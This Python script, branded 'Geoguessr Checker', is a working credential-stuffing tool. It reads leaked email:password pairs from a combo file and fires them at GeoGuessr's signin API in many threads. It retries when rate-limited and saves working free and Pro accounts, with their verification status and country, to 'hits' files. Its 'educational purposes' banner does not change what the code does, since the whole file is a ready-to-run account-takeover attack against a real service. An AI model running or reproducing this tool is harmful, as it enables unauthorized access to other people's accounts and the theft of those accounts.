import threading, requests, ctypes, os
from colorama import Fore, Style

name = "Geoguessr Checker"

os.system("cls"); ctypes.windll.kernel32.SetConsoleTitleW(f"{name} ") 

proxies = []
combos = []

w = Fore.WHITE
l = Fore.LIGHTMAGENTA_EX
rs = Style.RESET_ALL

class MAIN:
    def __init__(self):
        # req
        self.checking = True
        self.proxy_counter = 0
        self.counter = 0
        self.lock = threading.Lock()
        self.session = requests.Session()
        # var
        self.Ratelimits = 0
        self.Account_limits = 0
        self.Valids = 0
        self.Bad = 0
        self.Checked = 0
        self.Errors = 0
        self.Retries = 0
        self.Free = 0
        self.Url = "https://www.geoguessr.com/api/v3/accounts/signin"
        self.Headers = { 
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/json" 
        }


    def safeprint(self, arg):
        self.lock.acquire()
        print(arg)
        self.lock.release()

    def loadcumbers(self): 
        if os.path.exists("combo.txt"):
            with open ("combo.txt","r",encoding="UTF-8") as f:
                for line in f.readlines():
                    line = line.replace("\n", "")
                    combos.append(line)
                if len(combos) == 0:
                    print(Fore.RED + f"\a\n{l}[!] {w}Combo file is empty, please put in lines.")
                    input(); quit()
        else:
            open ("combo.txt", "x")
            print(Fore.RED + f"\a\n{l}[!] {w}Combo file is empty, please put lines in.")
            input(), quit()

    def Threads(self):
        try:
            threads = int(input(f'\n{w}> {l}Threads: {rs}'))
            os.system('cls')
            self.safeprint(a)
            return threads
        except ValueError:
            self.Threads()

    def title(self): 
        ctypes.windll.kernel32.SetConsoleTitleW(f"{name} - Checked: {self.Checked} | Pro Hits: {self.Valids} | Free Hits: {self.Free} | Bad: {self.Bad} | Account Ratelimits: {self.Account_limits} | Retries: {self.Retries}")

    def login(self,combo): 
        self.title()
        try:
            u = combo.split(":")[0] 
            p = combo.split(":")[1] 
            d = "{\"email\":\"" + u + " \",\"password\":\"" + p + "\"}"
            r = self.session.post(self.Url,headers=self.Headers,data=d)
            if 'Hmm...' in r.text:
                self.Checked += 1
                self.Bad += 1
            elif 'Please wait 60 minutes' in r.text:
                self.Checked += 1
                self.Account_limits += 1
                self.Retries += 1
                self.login(combo)
            elif 'isProUser":false' in r.text:
                self.Checked += 1
                self.Free += 1
                with open("Geoguessr Free Hits.txt", "a") as f:
                    f.write(f'{u}:{p}\n')
            elif 'isProUser":true' in r.text:
                self.Checked += 1
                self.Valids += 1
                try:
                    isVerified = r.text.split('isVerified":')[1].split(',')[0]
                except:
                    return None
                try:
                    countryCode = r.text.split('countryCode":"')[1].split('"')[0]
                except:
                    return None
                with open("Geoguessr Pro Hits.txt", "a") as f:
                    f.write(f'{u}:{p} | Verified: {isVerified} | Country: {countryCode} \n')
            self.title()
        except Exception as e: 
            self.Retries += 1
            self.title()
            pass

    def start(self):
        self.loadcumbers()
        threads = self.Threads()

        def thread_starter():
            self.login(combos[self.counter])   
            
        while self.checking:
            try:
                if threading.active_count() <= threads:
                    threading.Thread(target = thread_starter).start()
                    self.counter += 1
                if len(combos) <= self.counter:
                    self.checking = False
                    self.safeprint(f"\a{w}[{l}!{w}] {l}Done!{rs}")
            except Exception as e:
                pass

a = (l + f"""\n\n                                                    
\t\t\t\t _____ _____ _____ _____ _____ _____ _____ _____ _____ 
\t\t\t\t|   __|   __|     |   __|  |  |   __|   __|   __| __  |
\t\t\t\t|  |  |   __|  |  |  |  |  |  |   __|__   |__   |    -|
\t\t\t\t|_____|_____|_____|_____|_____|_____|_____|_____|__|__|
\n\n
\t\t    {w}Devloped by polo - Created for educational purposes -  github.com/59n for more!                                                                 
""")   

print(a) 
obj = MAIN()
obj.start()
input()
